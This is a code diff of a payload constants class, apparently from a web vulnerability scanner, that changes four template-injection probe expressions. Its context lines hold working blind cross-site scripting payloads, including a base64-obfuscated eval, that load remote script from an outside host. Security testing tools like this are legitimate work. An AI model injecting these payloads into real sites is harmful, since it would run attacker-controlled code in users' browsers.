@@ -49,10 +49,10 @@ public class PayloadConstants {
             new PayloadInfo("<link rel=\"stylesheet\" href=\"https://{hash}.lnk.tejq8.zcyy.fun/link.css\">", "<link>"),
             new PayloadInfo("\"><script src=\"https://js.rip/nm\"></script>", "bxss1"),
             new PayloadInfo("\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL25tIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>", "bxss2"),
-            new PayloadInfo("{{111*88}}", "SSTI1"),
-            new PayloadInfo("${111*88}", "SSTI2"),
-            new PayloadInfo("#{111*88}", "SSTI3"),
-            new PayloadInfo("[[${111*88}]]", "SSTI4")
+            new PayloadInfo("{{9188*8}}", "SSTI1"),
+            new PayloadInfo("${9188*8}", "SSTI2"),
+            new PayloadInfo("#{9188*8}", "SSTI3"),
+            new PayloadInfo("[[${9188*8}]]", "SSTI4")
 
 
             );
